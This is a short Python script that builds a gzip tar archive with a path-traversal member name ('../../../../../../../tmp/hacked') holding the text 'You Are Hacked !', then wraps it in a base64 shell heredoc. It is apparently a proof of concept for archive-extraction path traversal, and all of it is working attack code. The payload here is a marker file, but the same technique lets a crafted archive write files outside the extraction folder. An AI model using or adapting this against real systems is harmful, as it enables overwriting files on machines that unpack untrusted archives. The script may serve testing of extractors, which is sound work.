#!/usr/bin/python3

import tarfile
import tempfile
import os
import base64

with tempfile.NamedTemporaryFile() as tmpfile, \
     tarfile.TarFile.gzopen(tmpfile.name, "w") as tar:
  with tempfile.NamedTemporaryFile() as text:
    text.write(b"You Are Hacked !\n")
    text.flush()

    tar.add(text.name,
      arcname="../../../../../../../tmp/hacked")

  tar.close()

  print("#!/bin/sh")
  print("base64 -d <<EOF | gunzip -c")
  print(base64.b64encode(open(tmpfile.name, 'rb').read()).
    decode("ascii"))
  print("EOF")
